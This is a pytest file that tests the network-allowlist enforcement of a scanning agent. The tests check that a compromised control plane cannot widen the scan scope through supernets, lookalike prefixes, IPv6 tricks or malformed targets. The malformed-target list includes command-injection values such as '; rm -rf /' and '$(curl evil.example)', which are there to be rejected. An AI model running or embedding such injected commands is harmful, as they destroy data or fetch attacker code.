"""Allowlist enforcement, including the adversarial cases.

The threat model: the control plane is compromised and wants the agent to scan something
the customer never authorised. Every test below is an attempt to make that happen.
"""

from __future__ import annotations

import pytest

from threatsculpt_agent.allowlist import (
    REASON_MALFORMED_TARGET,
    REASON_NOT_IN_LOCAL,
    REASON_NOT_IN_NARROWED,
    evaluate_target,
    narrow,
    parse_network,
    parse_networks,
)
from threatsculpt_agent.errors import InvalidNetworkError

LOCAL = parse_networks(["10.0.0.0/8", "192.168.0.0/16"])


# --- the happy path ---------------------------------------------------------------


@pytest.mark.parametrize(
    "target",
    ["10.0.4.0/24", "10.0.0.0/8", "10.255.255.255/32", "10.0.4.12", "192.168.1.0/24"],
)
def test_targets_inside_the_local_allowlist_are_permitted(target: str) -> None:
    assert evaluate_target(target, LOCAL).allowed


# --- targets outside the local allowlist ------------------------------------------


@pytest.mark.parametrize(
    "target",
    [
        "8.8.8.8/32",  # someone else's DNS
        "172.16.0.0/12",  # RFC1918, but not ours
        "0.0.0.0/0",  # the whole internet
        "9.255.255.255/32",  # one address below the range
        "11.0.0.0/8",  # one block above it
        "192.169.0.0/16",  # adjacent to ours
    ],
)
def test_targets_outside_the_local_allowlist_are_rejected(target: str) -> None:
    decision = evaluate_target(target, LOCAL)
    assert not decision.allowed
    assert decision.reason == REASON_NOT_IN_LOCAL


def test_a_supernet_of_an_allowed_range_is_rejected() -> None:
    """10.0.0.0/7 CONTAINS 10.0.0.0/8. Containment must not be confused for membership."""
    decision = evaluate_target("10.0.0.0/7", LOCAL)
    assert not decision.allowed
    assert decision.reason == REASON_NOT_IN_LOCAL


def test_string_prefix_lookalikes_are_rejected() -> None:
    """'100.64.0.0/10' starts with '10' as text and is a completely different network.

    This is the exact bug a substring or startswith() check would ship.
    """
    for target in ("100.64.0.0/10", "10.0.0.0/8".replace("10.", "100."), "192.1680.0.0/16"):
        assert not evaluate_target(target, LOCAL).allowed


def test_an_empty_local_allowlist_rejects_everything() -> None:
    decision = evaluate_target("10.0.4.0/24", ())
    assert not decision.allowed
    assert decision.reason == REASON_NOT_IN_LOCAL


# --- the server may only narrow ---------------------------------------------------


def test_a_wider_server_allowlist_grants_nothing() -> None:
    """A compromised control plane sends 0.0.0.0/0 and asks for a third party's network."""
    server = parse_networks(["0.0.0.0/0"])
    decision = evaluate_target("8.8.8.8/32", LOCAL, server)
    assert not decision.allowed
    assert decision.reason == REASON_NOT_IN_LOCAL


def test_a_wider_server_allowlist_does_not_widen_the_effective_list() -> None:
    server = parse_networks(["0.0.0.0/0"])
    assert narrow(LOCAL, server) == LOCAL


def test_a_server_allowlist_of_someone_elses_range_is_ignored_entirely() -> None:
    server = parse_networks(["172.16.0.0/12", "8.8.8.0/24"])
    assert narrow(LOCAL, server) == ()
    assert not evaluate_target("8.8.8.8/32", LOCAL, server).allowed
    # ...and it also cannot be used to scan our own hosts, since it narrows to nothing.
    assert not evaluate_target("10.0.4.0/24", LOCAL, server).allowed


def test_the_server_can_narrow_within_the_local_allowlist() -> None:
    server = parse_networks(["10.0.4.0/24"])
    assert narrow(LOCAL, server) == parse_networks(["10.0.4.0/24"])

    assert evaluate_target("10.0.4.0/24", LOCAL, server).allowed
    outside = evaluate_target("10.0.5.0/24", LOCAL, server)
    assert not outside.allowed
    assert outside.reason == REASON_NOT_IN_NARROWED


def test_an_explicitly_empty_server_allowlist_denies_everything() -> None:
    decision = evaluate_target("10.0.4.0/24", LOCAL, ())
    assert not decision.allowed
    assert decision.reason == REASON_NOT_IN_NARROWED


def test_an_absent_server_allowlist_leaves_the_local_one_alone() -> None:
    assert evaluate_target("10.0.4.0/24", LOCAL, None).allowed


# --- malformed input ---------------------------------------------------------------


@pytest.mark.parametrize(
    "target",
    [
        "",
        "   ",
        "not-a-network",
        "10.0.0.0/33",
        "10.0.0.0/-1",
        "10.0.0.256/24",
        "10.0.4.12/24",  # host bits set: must not be silently widened to 10.0.4.0/24
        "10.0.0.0/8 10.0.0.0/8",
        "10.0.0.0/8; rm -rf /",
        "$(curl evil.example)",
        "10.0.0.0/8\n8.8.8.8/32",
    ],
)
def test_malformed_targets_are_rejected_not_guessed(target: str) -> None:
    decision = evaluate_target(target, LOCAL)
    assert not decision.allowed
    assert decision.reason in {REASON_MALFORMED_TARGET, REASON_NOT_IN_LOCAL}


def test_parse_network_refuses_host_bits() -> None:
    with pytest.raises(InvalidNetworkError):
        parse_network("10.0.4.12/24")


def test_parse_networks_fails_on_the_first_bad_entry() -> None:
    with pytest.raises(InvalidNetworkError, match="nope"):
        parse_networks(["10.0.0.0/8", "nope"])


# --- IPv6 ---------------------------------------------------------------------------


def test_ipv6_targets_are_matched_against_ipv6_entries() -> None:
    local = parse_networks(["2001:db8::/32"])
    assert evaluate_target("2001:db8:1::/48", local).allowed
    assert not evaluate_target("2001:db9::/32", local).allowed


def test_address_families_never_cross_match() -> None:
    """subnet_of() raises across versions; a swallowed TypeError would be a bypass."""
    v4_only = parse_networks(["10.0.0.0/8"])
    v6_only = parse_networks(["2001:db8::/32"])

    assert not evaluate_target("2001:db8::/32", v4_only).allowed
    assert not evaluate_target("10.0.4.0/24", v6_only).allowed
    assert narrow(v4_only, v6_only) == ()


def test_ipv4_mapped_ipv6_does_not_reach_an_ipv4_range() -> None:
    """::ffff:10.0.4.0/120 is not inside 10.0.0.0/8 as far as ipaddress is concerned."""
    assert not evaluate_target("::ffff:10.0.4.0/120", LOCAL).allowed


def test_mixed_family_allowlists_work_for_both() -> None:
    local = parse_networks(["10.0.0.0/8", "2001:db8::/32"])
    assert evaluate_target("10.0.4.0/24", local).allowed
    assert evaluate_target("2001:db8:1::/48", local).allowed
    assert not evaluate_target("8.8.8.8/32", local).allowed


# --- decisions are values ------------------------------------------------------------


def test_decisions_are_immutable_and_explain_themselves() -> None:
    decision = evaluate_target("8.8.8.8/32", LOCAL)
    assert decision.detail and "not within configured ranges" in decision.detail
    with pytest.raises(AttributeError):
        decision.allowed = True  # type: ignore[misc]
